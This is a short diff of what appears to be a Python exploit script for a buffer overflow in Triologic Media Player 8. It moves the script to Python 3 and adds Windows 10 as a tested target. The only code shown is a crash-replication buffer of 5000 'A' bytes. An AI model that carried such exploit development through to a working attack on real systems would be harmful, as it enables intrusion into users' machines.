@@ -1,8 +1,8 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 
 # Triologic Media Player 8
 # Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/14673
-# Exploit tested on Windows XP Pro SP3 FR
+# Exploit tested on Windows XP Pro SP3 FR / Windows 10.0.18363.778 Pro EN
  
 #Step 1: Replicate the crash
 buffer = b"A"*5000
